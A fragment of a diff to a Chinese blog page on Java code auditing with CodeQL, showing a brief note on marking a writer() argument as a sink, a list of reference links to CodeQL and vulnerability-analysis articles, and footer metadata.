+</code></pre>
+<p><img src="C:\Users\20174\AppData\Roaming\Typora\typora-user-images\image-20220118160246017.png" alt="image-20220118160246017"></p>
+<p>设置调用writer方法的类必须是org.datagear.util.IOUtil</p>
+<p> 查找一个writer()方法的调用点，并把它的第一个参数设置为file,并设置只调用唯一的write。</p>
+<p>设置writer第一位是sink</p>
+<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a target="_blank" rel="noopener" href="https://github.com/safe6Sec/CodeqlNote">https://github.com/safe6Sec/CodeqlNote</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7482">https://xz.aliyun.com/t/7482</a>    使用codeql挖掘fastjson利用链</p>
+<p><a target="_blank" rel="noopener" href="https://blog.jus4fun.xyz/article/114/">https://blog.jus4fun.xyz/article/114/</a>  山楂园</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/283795.html">https://www.freebuf.com/articles/web/283795.html</a>  CodeQL从入门到放弃</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10707#toc-3">https://xz.aliyun.com/t/10707#toc-3</a> （利用CodeQL分析并挖掘Log4j漏洞）</p>
+<p><a target="_blank" rel="noopener" href="https://fynch3r.github.io/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9B%9B/">https://fynch3r.github.io/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9B%9B/</a> （小窝）</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8240">https://xz.aliyun.com/t/8240</a> 如何用CodeQL数据流复现 apache kylin命令执行漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://blog.actorsfit.com/a?ID=00001-f665bbf4-5968-4424-82b9-02bb970f3cbf">https://blog.actorsfit.com/a?ID=00001-f665bbf4-5968-4424-82b9-02bb970f3cbf</a> 如何使用 CodeQL 挖掘 CVE-2020-10199</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Firebasky/CodeqlLearn/blob/main/example/Sentinel/ssrf.md">https://github.com/Firebasky/CodeqlLearn/blob/main/example/Sentinel/ssrf.md</a>  Sentinel存在SSRF</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 2017441810@qq.com </span>
@@ -1098,12 +1277,12 @@ public class CommonsBeanutilsShiroTest &#123;
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">Title:</span></p>
-    <p><span class="copy-title">Count:</span><span class="post-count">2.2k</span></p>
+    <p><span class="copy-title">Title:</span>java代码审计-codeql学习</p>
+    <p><span class="copy-title">Count:</span><span class="post-count">3.8k</span></p>
     <p><span class="copy-title">Author:</span><a  title="juneRain">juneRain</a></p>
-    <p><span class="copy-title">Created At:</span>2021-12-14, 16:18:52</p>
-    <p><span class="copy-title">Updated At:</span>2021-12-30, 16:45:32</p>
-    <span class="copy-title">Url:</span><a class="post-url" href="/2021/12/14/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Shiro%E5%88%86%E6%9E%90/" title="">http://example.com/2021/12/14/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Shiro%E5%88%86%E6%9E%90/</a>
+    <p><span class="copy-title">Created At:</span>2021-09-07, 23:22:12</p>
+    <p><span class="copy-title">Updated At:</span>2022-01-19, 16:47:02</p>
+    <span class="copy-title">Url:</span><a class="post-url" href="/2021/09/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-codeql/" title="java代码审计-codeql学习">http://example.com/2021/09/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-codeql/</a>
     <p>
         <span class="copy-title">Copyright:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">&#39;Attribution-non-commercial-shared in the same way 4.0&#39;</a> Reprint please keep the original link and author.
     </p>
